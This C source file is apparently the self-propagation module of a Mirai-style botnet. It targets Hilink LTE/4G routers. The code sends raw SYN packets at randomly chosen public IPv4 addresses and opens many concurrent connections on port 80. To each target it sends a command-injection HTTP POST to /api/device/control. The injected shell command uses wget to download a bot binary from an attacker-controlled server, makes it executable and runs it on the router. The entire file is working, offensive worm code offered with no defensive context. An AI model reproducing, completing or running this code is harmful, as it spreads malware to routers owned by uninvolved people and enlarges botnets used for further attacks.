#ifdef SELFREP

#define _GNU_SOURCE

#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "includes.h"
#include "hilink.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"

/* Hilink Scanner - targets Hilink LTE/4G routers */
#define HILINK_SCANNER_MAX_CONNS 128
#define HILINK_SCANNER_RAW_PPS 64
#define HILINK_SCANNER_PORT 80

int hilink_scanner_pid = 0, hilink_rsck = 0;
char hilink_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct hilink_scanner_connection *conn_table;
uint32_t hilink_fake_time = 0;

/* Hilink exploit - command injection via form parameters */
static char *hilink_payload =
    "POST /api/device/control HTTP/1.1\r\n"
    "Host: %d.%d.%d.%d\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 100\r\n"
    "Connection: close\r\n"
    "\r\n"
    "goformId=COMMAND&command=`cd /tmp; wget http://" HTTP_SERVER_IP "/bins/axis.$(uname -m); chmod +x axis.$(uname -m); ./axis.$(uname -m) &`";

struct hilink_scanner_connection {
    int fd;
    ipv4_t dst_addr;
    uint16_t dst_port;
    uint8_t state;
    time_t last_recv;
    char rdbuf[2048];
    int rdbuf_pos;
    char payload_buf[2048];
};

#define HILINK_SC_CLOSED 0
#define HILINK_SC_CONNECTING 1
#define HILINK_SC_EXPLOIT 2

static ipv4_t get_random_hilink_ip(void);
static void hilink_setup_connection(struct hilink_scanner_connection *);

int hilink_recv_strip_null(int sock, void *buf, int len, int flags) {
    int ret = recv(sock, buf, len, flags);
    if (ret > 0) {
        for (int i = 0; i < ret; i++) {
            if (((char *)buf)[i] == 0x00) ((char *)buf)[i] = 'A';
        }
    }
    return ret;
}

void hilink_scanner_init(void) {
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    hilink_scanner_pid = fork();
    if (hilink_scanner_pid > 0 || hilink_scanner_pid == -1) return;

    LOCAL_ADDR = util_local_addr();
    rand_init();
    hilink_fake_time = time(NULL);
    
    conn_table = calloc(HILINK_SCANNER_MAX_CONNS, sizeof(struct hilink_scanner_connection));
    for (i = 0; i < HILINK_SCANNER_MAX_CONNS; i++) {
        conn_table[i].state = HILINK_SC_CLOSED;
        conn_table[i].fd = -1;
        conn_table[i].rdbuf_pos = 0;
    }

    if ((hilink_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
        exit(0);
    }
    fcntl(hilink_rsck, F_SETFL, O_NONBLOCK | fcntl(hilink_rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(hilink_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0) {
        close(hilink_rsck);
        exit(0);
    }

    do {
        source_port = rand_next() & 0xffff;
    } while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)hilink_scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = LOCAL_ADDR;

    tcph->source = source_port;
    tcph->dest = htons(HILINK_SCANNER_PORT);
    tcph->seq = rand_next();
    tcph->doff = 5;
    tcph->syn = TRUE;
    tcph->window = rand_next() & 0xffff;

    while (TRUE) {
        fd_set fdset;
        struct timeval timeo;
        struct sockaddr_in paddr;
        int mfd = 0, nfds;

        FD_ZERO(&fdset);
        FD_SET(hilink_rsck, &fdset);
        mfd = hilink_rsck;

        for (i = 0; i < HILINK_SCANNER_MAX_CONNS; i++) {
            if (conn_table[i].state != HILINK_SC_CLOSED) {
                FD_SET(conn_table[i].fd, &fdset);
                if (conn_table[i].fd > mfd) mfd = conn_table[i].fd;
            }
        }

        timeo.tv_sec = 0;
        timeo.tv_usec = 1000;
        nfds = select(mfd + 1, &fdset, NULL, NULL, &timeo);
        
        if (nfds == -1) break;
        
        if (nfds == 0) {
            struct iphdr *iph = (struct iphdr *)hilink_scanner_rawpkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            for (i = 0; i < HILINK_SCANNER_RAW_PPS; i++) {
                iph->id = rand_next();
                iph->daddr = get_random_hilink_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

                tcph->seq = rand_next();
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(hilink_rsck, hilink_scanner_rawpkt, sizeof(hilink_scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }

            for (i = 0; i < HILINK_SCANNER_MAX_CONNS; i++) {
                struct hilink_scanner_connection *conn = &conn_table[i];
                if (conn->state == HILINK_SC_CLOSED) {
                    conn->dst_addr = get_random_hilink_ip();
                    conn->dst_port = HILINK_SCANNER_PORT;
                    hilink_setup_connection(conn);
                    break;
                }
            }
        } else {
            for (i = 0; i < HILINK_SCANNER_MAX_CONNS; i++) {
                struct hilink_scanner_connection *conn = &conn_table[i];
                if (conn->state == HILINK_SC_CLOSED) continue;

                if (FD_ISSET(conn->fd, &fdset)) {
                    if (conn->state == HILINK_SC_CONNECTING) {
                        int err = 0;
                        socklen_t err_len = sizeof(err);
                        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                        if (err != 0) {
                            conn->state = HILINK_SC_CLOSED;
                            continue;
                        }
                        snprintf(conn->payload_buf, sizeof(conn->payload_buf), hilink_payload,
                            (conn->dst_addr >> 24) & 0xFF,
                            (conn->dst_addr >> 16) & 0xFF,
                            (conn->dst_addr >> 8) & 0xFF,
                            conn->dst_addr & 0xFF);
                        send(conn->fd, conn->payload_buf, strlen(conn->payload_buf), MSG_NOSIGNAL);
                        conn->state = HILINK_SC_EXPLOIT;
                        conn->last_recv = hilink_fake_time;
                    } else if (conn->state == HILINK_SC_EXPLOIT) {
                        conn->state = HILINK_SC_CLOSED;
                    }
                }

                if (conn->state != HILINK_SC_CLOSED && conn->state != HILINK_SC_CONNECTING) {
                    int ret = hilink_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos,
                        sizeof(conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret <= 0) {
                        conn->state = HILINK_SC_CLOSED;
                        close(conn->fd);
                        conn->fd = -1;
                    } else {
                        conn->rdbuf_pos += ret;
                        conn->last_recv = hilink_fake_time;
                    }
                }

                if (conn->state != HILINK_SC_CLOSED && (hilink_fake_time - conn->last_recv) > 30) {
                    conn->state = HILINK_SC_CLOSED;
                    close(conn->fd);
                    conn->fd = -1;
                }
            }
        }
        hilink_fake_time = time(NULL);
    }
}

void hilink_kill(void) {
    kill(hilink_scanner_pid, 9);
}

static void hilink_setup_connection(struct hilink_scanner_connection *conn) {
    struct sockaddr_in addr;
    int flags;

    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) {
        conn->state = HILINK_SC_CLOSED;
        return;
    }

    flags = fcntl(conn->fd, F_GETFL, 0);
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | flags);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(conn->dst_port);

    conn->state = HILINK_SC_CONNECTING;
    conn->last_recv = hilink_fake_time;
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));
}

static ipv4_t get_random_hilink_ip(void) {
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do {
        tmp = rand_next();
        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    } while (o1 == 127 || o1 == 0 || o1 == 10 || (o1 == 192 && o2 == 168));

    return INET_ADDR(o1, o2, o3, o4);
}

#endif
